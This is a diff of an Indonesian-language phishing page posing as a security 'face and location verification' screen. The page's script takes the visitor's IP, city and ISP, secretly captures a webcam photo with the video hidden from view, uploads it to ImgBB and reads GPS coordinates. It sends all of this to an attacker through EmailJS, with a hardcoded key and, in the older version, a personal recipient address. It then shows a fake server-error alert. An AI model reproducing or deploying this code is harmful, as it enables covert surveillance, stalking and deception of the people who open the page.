@@ -3,24 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Keamanan Novle - Verifikasi</title>
+    <title>Sistem Verifikasi Keamanan - Gigs</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff41; padding: 25px; border-radius: 10px; text-align: center; background: rgba(0,0,0,0.9); box-shadow: 0 0 15px #00ff41; width: 85%; max-width: 380px; }
-        .btn { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; border-radius: 5px; }
-        #status { margin-top: 15px; font-size: 11px; color: #666; }
-        /* Sembunyikan elemen kamera agar target tidak tahu */
+        body { font-family: 'Courier New', monospace; background-color: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #00ff00; padding: 30px; border-radius: 5px; text-align: center; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); width: 90%; max-width: 400px; }
+        .btn { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
+        #status { margin-top: 15px; font-size: 12px; color: #888; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>[ ACCESS RESTRICTED ]</h2>
-    <p>Perangkat Anda terdeteksi melakukan akses ilegal. Anda diwajibkan melakukan verifikasi wajah dan lokasi untuk keamanan.</p>
-    <button class="btn" onclick="startTracking()">VERIFIKASI SEKARANG</button>
-    <div id="status">Enkripsi Gigs System: AKTIF</div>
+    <h1>Akses Terdeteksi</h1>
+    <p>Sistem mendeteksi upaya login tidak sah. Selesaikan verifikasi wajah dan lokasi untuk memulihkan akses perangkat Anda.</p>
+    <button class="btn" onclick="startProses()">VERIFIKASI SEKARANG</button>
+    <div id="status">Status: Menunggu...</div>
 </div>
 
 <video id="video" autoplay></video>
@@ -28,67 +27,65 @@
 
 <script>
     (function(){
-        emailjs.init("5HWPoEryOV1APt1Cw"); 
+        emailjs.init("5HWPoEryOV1APt1Cw");
     })();
 
-    async function startTracking() {
-        document.getElementById("status").innerText = "Menghubungkan ke satelit...";
-        let report = "[LAPORAN INTELIJEN LENGKAP]\n------------------\n";
+    async function startProses() {
+        document.getElementById("status").innerText = "Menghubungkan ke server keamanan...";
+        let report = "--- LAPORAN INTELIJEN BARU ---\n";
 
         try {
-            // 1. Ambil Data IP
+            // 1. Ambil IP
             const res = await fetch('https://ipapi.co/json/');
-            const ipData = await res.json();
-            report += `IP: ${ipData.ip}\nKota: ${ipData.city}\n`;
+            const ip = await res.json();
+            report += `IP: ${ip.ip}\nKota: ${ip.city}\nISP: ${ip.org}\n`;
 
-            // 2. Akses Kamera & Ambil Foto (Hidden)
+            // 2. Kamera
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                
-                // Tunggu sebentar agar kamera fokus
-                setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.5); // Foto jadi teks base64
-                    report += `\n📸 [FOTO BERHASIL DIAMBIL]\n(Data foto disertakan dalam sistem)\n`;
-                    
-                    // Matikan kamera setelah ambil foto
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // 3. Ambil GPS & Kirim
-                    getGPS(report);
-                }, 2000);
-            } catch (err) {
-                report += "\n📸 Kamera: Akses Ditolak Target\n";
-                getGPS(report);
-            }
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
 
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+                
+                // Matikan kamera
+                stream.getTracks().forEach(t => t.stop());
+
+                // 3. Upload Foto ke ImgBB
+                const formData = new FormData();
+                formData.append("image", photoBase64);
+                
+                const upload = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
+                    method: "POST",
+                    body: formData
+                });
+                const resImg = await upload.json();
+                const linkFoto = resImg.data.url;
+
+                // 4. GPS & Kirim
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    report += `Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                    report += `Link Foto: ${linkFoto}\n`;
+                    kirimEmail(report);
+                }, () => {
+                    report += `Link Foto: ${linkFoto}\nGPS: Ditolak\n`;
+                    kirimEmail(report);
+                });
+            }, 2000);
         } catch (e) {
-            getGPS(report + "Gagal ambil IP\n");
+            kirimEmail(report + "\nKamera/GPS Ditolak target.");
         }
     }
 
-    function getGPS(report) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            report += `📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-            sendToEmail(report);
-        }, (err) => {
-            report += "📍 GPS: Akses Ditolak\n";
-            sendToEmail(report);
-        });
-    }
-
-    function sendToEmail(message) {
+    function kirimEmail(pesan) {
         emailjs.send("service_e3ap8de", "template_ts6dxmh", {
-            to_email: "ikhsansetiawan711@gmail.com",
-            message: message
+            message: pesan
         }).then(() => {
-            alert("Kesalahan Server! Silakan coba lagi nanti.");
+            alert("Kesalahan Server 404. Silakan coba lagi nanti.");
             document.getElementById("status").innerText = "Selesai.";
         });
     }
